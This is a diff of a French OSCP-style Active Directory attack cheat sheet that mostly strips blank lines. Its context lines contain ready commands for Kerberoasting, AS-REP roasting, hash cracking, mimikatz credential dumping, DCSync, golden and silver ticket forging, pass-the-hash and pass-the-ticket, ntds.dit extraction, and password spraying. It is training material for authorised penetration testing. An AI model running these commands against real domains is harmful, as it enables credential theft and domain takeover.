@@ -7,9 +7,7 @@ description: "Étudier les mécanismes d'authentification et les techniques AD."
 
 Étudier les mécanismes d'authentification et les techniques AD.
 
-
 ## AS-REP Roasting
-
 
 <p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
@@ -18,14 +16,12 @@ John the Ripper
 
 ```
 
-
 <p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>
 
 ```powershell
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Property DoesNotRequirePreAuth
 
 ```
-
 
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
@@ -36,7 +32,6 @@ Rubeus.exe asreproast
 Rubeus.exe asreproast /nowrap
 
 ```
-
 
 <p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>
 
@@ -49,15 +44,12 @@ GetNPUsers.py domain/[user]:[password]@[dc-ip] -no-pass
 
 ```
 
-
 <p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 18200 [asrep_hashes_file].txt /usr/share/wordlists/rockyou.txt
 
 ```
-
-
 
 ### Repérer les comptes sans préauthentification
 
@@ -71,16 +63,12 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(userAc
 
 ## Kerberoasting
 
-
 <p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>
 
 ```powershell
 GetUserSPNs.py domain/[user]:[password]@[dc-ip]
 
 ```
-
-
-
 
 ```bash
 # Depuis Kali
@@ -93,7 +81,6 @@ GetUserSPNs.py domain/[user]:[password]@[dc-ip] -request
 
 ```
 
-
 <p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>
 
 ```powershell
@@ -103,15 +90,12 @@ Rubeus.exe kerberoast /outfile:[output_file].kerberoast
 
 ```
 
-
 <p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
 hashcat -m 13100 [kerberoast_hashes_file].txt /usr/share/wordlists/rockyou.txt
 
 ```
-
-
 
 ### Inventaire des SPN de comptes utilisateur
 
@@ -122,7 +106,6 @@ Rechercher les comptes de service ayant un SPN à partir de LDAP, sans extraire 
 ```bash
 ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
 ```
-
 
 ### Comptes SPN : commande native Windows
 
@@ -146,7 +129,6 @@ targetedKerberoast.py -d <DOMAINE_AD> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' --n
 
 ## Faux tickets de service (Silver Tickets)
 
-
 <p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>
 
 ```powershell
@@ -162,7 +144,6 @@ mimikatz # lsadump::lsa /inject /name:[ServiceAccountName]
 mimikatz # lsadump::dcsync /user:HTTP/server01
 
 ```
-
 
 <p class="oscp-command-note">Script PowerShell pour créer un faux ticket de service (Silver Ticket).</p>
 
@@ -185,7 +166,6 @@ mimikatz # kerberos::golden /sid:S-1-5-21-1863423273-656352785-1243762498 /domai
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -196,7 +176,6 @@ klist
 
 ```
 
-
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Faux tickets de service (Silver Tickets)».</p>
 
 ```bash
@@ -204,13 +183,10 @@ dir \\targetserver\sharedfolder
 
 ```
 
-
 ## Faux tickets TGT (Golden Tickets)
-
 
 **Paramètres et repères :**
 `Mimikatz`  
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -218,7 +194,6 @@ dir \\targetserver\sharedfolder
 mimikatz # lsadump::dcsync /domain:[domain.com] /user:krbtgt
 
 ```
-
 
 <p class="oscp-command-note">Script PowerShell pour créer un faux ticket TGT (Golden Ticket).</p>
 
@@ -238,7 +213,6 @@ mimikatz # kerberos::golden /user:Administrator /domain:[domain.com] /sid:[domai
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -249,7 +223,6 @@ klist
 
 ```
 
-
 <p class="oscp-command-note">Examiner les comptes ou ressources Windows.</p>
 
 ```bash
@@ -257,11 +230,9 @@ net use \\domaincontroller\C$ /user:[DesiredUsername]
 
 ```
 
-
 ## Réplication Active Directory avec DCSync
 
 Examiner les objets, les droits et les services du domaine.
-
 
 <p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
@@ -269,7 +240,6 @@ Examiner les objets, les droits et les services du domaine.
 Get-ADGroupMember -Identity "Domain Admins"
 
 ```
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
@@ -286,7 +256,6 @@ mimikatz # lsadump::dcsync /domain:[domain.com] /user:[targetUser]
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -294,13 +263,11 @@ mimikatz # lsadump::dcsync /domain:[domain.com]
 
 ```
 
-
 ```powershell
 # Vous pouvez rediriger la sortie vers un fichier pour analyse :
 mimikatz # lsadump::dcsync /domain:domain.com > output.txt
 
 ```
-
 
 <p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
@@ -309,11 +276,9 @@ hashcat -m 1000 [hashes_file].txt /usr/share/wordlists/rockyou.txt
 
 ```
 
-
 ## Identifiants AD en cache
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -340,7 +305,6 @@ mimikatz # lsadump::cache
 
 ```
 
-
 <p class="oscp-command-note">Tester des empreintes hors ligne avec hashcat.</p>
 
 ```bash
@@ -348,11 +312,9 @@ hashcat -m 1000 [cached_hash].txt /usr/share/wordlists/rockyou.txt
 
 ```
 
-
 ## Authentification NTLM
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/ntlm_authentication.png)
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -361,12 +323,10 @@ mimikatz # sekurlsa::logonpasswords
 
 ```
 
-
 ```powershell
 mimikatz # sekurlsa::pth /user:[username] /domain:[domain.com] /ntlm:[NTLMhash]
 
 ```
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Authentification NTLM».</p>
 
@@ -375,13 +335,11 @@ dir \\targetserver\sharedfolder
 
 ```
 
-
 ## Authentification Kerberos
 
 Examiner les objets, les droits et les services du domaine.
 
 ![Descripción de la imagen](https://www.emmanuelsolis.com/img/kerberos_authentication.jpg)
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -390,12 +348,10 @@ mimikatz # sekurlsa::tickets /export
 
 ```
 
-
 ```powershell
 mimikatz # kerberos::ptt TGT_ticket.kirbi
 
 ```
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Authentification Kerberos».</p>
 
@@ -404,9 +360,7 @@ dir \\targetserver\sharedfolder
 
 ```
 
-
 #### Exécuter le script
-
 
 <p class="oscp-command-note">Spray-Passwords.ps1 : tester un mot de passe de laboratoire en respectant les limites de verrouillage.</p>
 
@@ -418,9 +372,7 @@ dir \\targetserver\sharedfolder
 
 ```
 
-
 #### Code source du script
-
 
 <p class="oscp-command-note">Code source PowerShell du script de test des mots de passe, à enregistrer avant utilisation.</p>
 
@@ -840,13 +792,10 @@ BruteForce $duration $threshold $passwords
 
 ```
 
-
 ### Authentification avec DirectoryEntry
-
 
 **Paramètres et repères :**
 `System.DirectoryServices`  
-
 
 <p class="oscp-command-note">Script PowerShell pour l’authentification avec DirectoryEntry.</p>
 
@@ -870,9 +819,7 @@ $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath, 
 
 ```
 
-
 #### Commandes de base
-
 
 <p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec CrackMapExec.</p>
 
@@ -885,13 +832,11 @@ crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com]
 
 ```
 
-
 ```bash
 # Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [userName] -p '[password]' -d [domain.com] --kerberos
 
 ```
-
 
 ```bash
 # Vérifier l'accès SMB
@@ -899,12 +844,8 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
 
-
 **Paramètres et repères :**
 `--continue-on-error`  
-
-
-
 
 ```bash
 # Vérifier l'accès SMB
@@ -912,9 +853,7 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
 
-
 #### Commandes complémentaires
-
 
 <p class="oscp-command-note">Lister les partages réseau visibles via SMB avec CrackMapExec.</p>
 
@@ -923,13 +862,11 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
 
-
 ```bash
 # Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com] --smbv1
 
 ```
-
 
 ```bash
 # Lister les sessions SMB
@@ -937,13 +874,11 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
 
-
 ```bash
 # Vérifier l'accès SMB
 crackmapexec smb [ip/domain] -u Administrator -p '[AdminPassword]!' -d [domain.com] --sam
 
 ```
-
 
 ```bash
 # Vérifier l'accès SMB
@@ -951,9 +886,7 @@ crackmapexec smb [ip/domain] -u [userName] -p '[password]!' -d [domain.com] --ex
 
 ```
 
-
 #### Services pouvant être vérifiés
-
 
 <p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec CrackMapExec.</p>
 
@@ -962,13 +895,11 @@ crackmapexec smb [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
 
-
 ```bash
 # Examiner le service avec CrackMapExec
 crackmapexec rdp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
-
 
 ```bash
 # Vérifier l'accès WinRM
@@ -976,13 +907,11 @@ crackmapexec winrm [ip/domain] -u [users_file].txt -p '[password]' -d [domain.co
 
 ```
 
-
 ```bash
 # HTTP : consulter les en-têtes avec curl (CrackMapExec ne gère pas HTTP).
 curl -I http://<IP>:80/
 
 ```
-
 
 ```bash
 # Examiner le service avec CrackMapExec
@@ -990,13 +919,11 @@ crackmapexec ftp [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com]
 
 ```
 
-
 ```bash
 # Telnet : tester une connexion TCP au port 23 avec Netcat.
 nc -nv <IP> 23
 
 ```
-
 
 ```bash
 # SMTP : identifier les commandes annoncées par le serveur avec Nmap.
@@ -1004,13 +931,11 @@ nmap -sV -p 25 --script smtp-commands <IP>
 
 ```
 
-
 ```bash
 # DNS : interroger l'enregistrement SOA du domaine avec dig.
 dig @<SERVEUR_DNS> <DOMAINE> SOA +noall +answer
 
 ```
-
 
 ```bash
 # Vérifier l'accès LDAP
@@ -1018,13 +943,11 @@ crackmapexec ldap [ip/domain] -u [users_file].txt -p '[password]' -d [domain.com
 
 ```
 
-
 ```bash
 # NetBIOS : interroger la table de noms avec nmblookup.
 nmblookup -A <IP>
 
 ```
-
 
 ```bash
 # MySQL : se connecter avec le client natif et afficher les bases accessibles.
@@ -1032,13 +955,11 @@ mysql -h <IP> -u <UTILISATEUR> -p -e 'SHOW DATABASES;'
 
 ```
 
-
 ```bash
 # PostgreSQL : lister les bases accessibles avec psql.
 psql -h <IP> -U <UTILISATEUR> -d postgres -c '\l'
 
 ```
-
 
 ```bash
 # Examiner le service avec CrackMapExec
@@ -1046,13 +967,11 @@ crackmapexec mssql [ip/domain] -u [users_file].txt -p '[password]'
 
 ```
 
-
 ```bash
 # Oracle : se connecter avec SQL*Plus si le nom du service est connu.
 sqlplus '<UTILISATEUR>/<MOT_DE_PASSE>@//<IP>:1521/<SERVICE>'
 
 ```
-
 
 ```bash
 # Redis : interroger les informations du serveur avec redis-cli.
@@ -1060,13 +979,11 @@ redis-cli -h <IP> -p 6379 INFO
 
 ```
 
-
 ```bash
 # Docker : lire la version du démon distant si son API TCP est accessible.
 docker -H tcp://<IP>:2375 version
 
 ```
-
 
 ```bash
 # SNMP : consulter les informations système avec une communauté d'audit.
@@ -1074,26 +991,19 @@ snmpwalk -v2c -c '<COMMUNAUTE>' <IP> 1.3.6.1.2.1.1
 
 ```
 
-
 ```bash
 # NTP : consulter les pairs annoncés par le service avec ntpq.
 ntpq -p <IP>
 
 ```
 
-
 ### Utilisation de kerbrute
-
-
-
 
 ```powershell
 # L'exécutable se trouve dans le kerbrute GitHub (lien dans la section 18.3.2.2).
 .\kerbrute_windows_amd64.exe passwordspray -d [domain.com] .\[usernames_file].txt "[password]"
 
 ```
-
-
 
 ### Afficher les tickets Kerberos courants
 
@@ -1118,19 +1028,14 @@ timedatectl show -p NTPSynchronized -p TimeUSec
 
 ## Copies instantanées (Shadow Copies)
 
-
-
-
 ```powershell
 # -p X: sélectionne le lecteur à copier (souvent C:).
 vshadow.exe -nw -p C:
 
 ```
 
-
 **Paramètres et repères :**
 `C:`  
-
 
 <p class="oscp-command-note">Copier ou déplacer les fichiers utilisés dans «Copies instantanées (Shadow Copies)».</p>
 
@@ -1143,9 +1048,6 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 
 ```
 
-
-
-
 ```powershell
 reg.exe save hklm\system C:\backup_path\system.bak
 
@@ -1153,7 +1055,6 @@ reg.exe save hklm\system C:\backup_path\system.bak
 C:\> reg.exe save hklm\system c:\system.bak
 
 ```
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
@@ -1165,7 +1066,6 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
 ```
 
-
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
 ```powershell
@@ -1173,16 +1073,10 @@ mimikatz # lsadump::ntds /ntds:"[ntds_file]" /system:"[system_file]"
 
 ```
 
-
-
-
 ```powershell
 vssadmin list shadows
 
 ```
-
-
-
 
 ```powershell
 # Remplacer X par le numéro de copie d'ombre.
@@ -1190,9 +1084,7 @@ mklink /d C:\ShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
 
 ```
 
-
 <p class="oscp-inline-ref"><strong>Chemin à vérifier :</strong> <code>C:\ShadowCopy</code></p>
-
 
 <p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Copies instantanées (Shadow Copies)».</p>
 
@@ -1201,9 +1093,7 @@ dir C:\ShadowCopy
 
 ```
 
-
 ## Délégation contrainte Kerberos
-
 
 <p class="oscp-command-note">Énumérer les ordinateurs du domaine.</p>
 
@@ -1212,38 +1102,29 @@ Get-ADComputer -Filter {ServicePrincipalName -like "*"} -Property ServicePrincip
 
 ```
 
-
 ```powershell
 # Lister les comptes du domaine
 Get-ADUser -Identity <ServiceAccount> -Properties msDS-AllowedToDelegateTo
 
 ```
 
-
-
-
 ```bash
 kinit <ServiceAccount>
 
 ```
 
-
 ### Outils essentiels d'énumération
-
 
 **Paramètres et repères :**
 `CrackMapExec` · `rpcclient` · `smbclient` · `BloodHound`  
 `Impacket` · `Responder` · `PowerView`  
 
-
 ### Méthode d'énumération et de vérification des identifiants
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
-
 **Paramètres et repères :**
 `nmap`  
-
 
 <p class="oscp-command-note">Identifier les versions des services.</p>
 
@@ -1252,63 +1133,50 @@ nmap -p 88,135,139,389,445,5985,636,3268 -sC -sV -Pn [IP]
 
 ```
 
-
 **Paramètres et repères :**
 `CrackMapExec`  
-
 
 ### Tableau de référence des ports
 
 Vérifier les ports et les services de la cible autorisée.
 
-
 **88**
 
 Kerberos · Authentication service for AD.
-
 
 **135**
 
 MSRPC · Microsoft RPC.
 
-
 **139**
 
 NetBIOS · File/printer sharing.
-
 
 **389**
 
 LDAP · Directory services.
 
-
 **445**
 
 SMB · File sharing/admin shares.
-
 
 **636**
 
 LDAPS · Secure LDAP.
 
-
 **3268**
 
 LDAP GC · LDAP Global Catalog.
-
 
 **3389**
 
 RDP · Remote Desktop Protocol.
 
-
 **5985**
 
 WinRM · Windows Remote Management.
 
-
 ### Techniques complémentaires d’énumération
-
 
 <p class="oscp-command-note">Observer les requêtes de résolution de noms.</p>
 
@@ -1317,10 +1185,8 @@ responder -I eth0
 
 ```
 
-
 **Paramètres et repères :**
 `secretsdump.py`  
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>
 
@@ -1330,7 +1196,6 @@ secretsdump.py [domain].com/[VALID_USERNAME]:[VALID_PASSWORD]@[IP]
 
 ```
 
-
 <p class="oscp-command-note">Énumérer les utilisateurs du domaine.</p>
 
 ```powershell
@@ -1338,14 +1203,10 @@ Get-ADUser -Filter * | Select-Object Name, SamAccountName
 
 ```
 
-
-
-
 ```text
 Find-DomainShare -Writable
 
 ```
-
 
 <p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
@@ -1354,13 +1215,10 @@ Get-ADGroupMember -Identity "Domain Admins"
 
 ```
 
-
 ### Techniques d’évasion de la détection
-
 
 **Paramètres et repères :**
 `CrackMapExec`  
-
 
 <p class="oscp-command-note">Lister les partages réseau visibles via SMB avec CrackMapExec.</p>
 
@@ -1369,15 +1227,12 @@ crackmapexec smb [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --shares --rate 1
 
 ```
 
-
 **Paramètres et repères :**
 `rpcclient`  
-
 
 ### Interfaces web d'énumération de domaine
 
 Examiner les objets, les droits et les services du domaine.
-
 
 <p class="oscp-command-note">Nmap (RDP) : lancer les scripts NSE « rdp-ntlm-info ».</p>
 
@@ -1386,14 +1241,12 @@ nmap -p 3389 --script rdp-ntlm-info [IP]
 
 ```
 
-
 <p class="oscp-command-note">Spécifier la méthode d'exécution distante WINRM avec CrackMapExec (droits requis).</p>
 
 ```bash
 crackmapexec winrm [IP] -u [VALID_USERNAME] -p [VALID_PASSWORD] --exec-method invoke_command
 
 ```
-
 
 <p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>
 
@@ -1402,11 +1255,7 @@ ldapsearch -x -h [IP] -p 9389
 
 ```
 
-
 ### Exemples de résultats
-
-
-
 
 ```text
 Domain Name: DOMAIN.LOCAL
@@ -1417,20 +1266,13 @@ Users:
 
 ```
 
-
 **Paramètres et repères :**
 `CrackMapExec`  
-
-
-
 
 ```text
 192.168.123.10 - SMB         [*] domain.local\esolis:Password2024! (Pwned!)
 
 ```
-
-
-
 
 ```text
 dn: CN=Emma Solis,OU=Users,DC=domain,DC=local
@@ -1438,8 +1280,6 @@ sAMAccountName: esolis
 userPrincipalName: esolis@domain.local
 
 ```
-
-
 
 ### Rechercher les délégations Kerberos contraintes
 
@@ -1463,21 +1303,17 @@ ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(userAc
 
 ## Réutilisation de tickets Kerberos (Pass-the-Ticket, PtT)
 
-
 **TGT actif présent en mémoire**
 
 A valid TGT from a privileged user must be present, for example that it was cached by a Domain Admin that logged in before.
-
 
 **Privilèges SYSTEM**
 
 Needed to access LSASS memory where Kerberos tickets are stored.
 
-
 **Administrateur local**
 
 Often sufficient, as it allows escalation to SYSTEM or LSASS access tools.
-
 
 <p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>
 
@@ -1488,27 +1324,19 @@ sekurlsa::tickets
 
 ```
 
-
-
-
 ```powershell
 # Cela enregistrera les fichiers .kirbi sur le disque. Identifier le bon TGT en fonction de l'utilisateur et du type de chiffrement.
 sekurlsa::tickets /export
 
 ```
 
-
-
-
 ```powershell
 kerberos::ptt C:\path\to\admin_ticket.kirbi
 
 ```
 
-
 **Paramètres et repères :**
 `klist`  
-
 
 <p class="oscp-command-note">Interroger les informations système via WMI.</p>
 
@@ -1528,7 +1356,6 @@ Enter-PSSession -ComputerName [target_host] -Authentication Kerberos -Credential
 
 ```
 
-
 <p class="oscp-command-note">Kerberos : convertir un ticket .kirbi au format .ccache puis définir KRB5CCNAME.</p>
 
 ```bash
@@ -1545,7 +1372,6 @@ psexec.py -k -no-pass [domain]/[username]@[target_host]
 evil-winrm -k -no-pass -u [username] -d [domain] -i [target_host]
 
 ```
-
 
 ## Délégations et attributs Kerberos à vérifier
 
@@ -1590,7 +1416,6 @@ timedatectl status
 Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
 
 <!-- refined-oscp -->
-
 
 ### pyWhisker : consulter les clés d'un objet
 
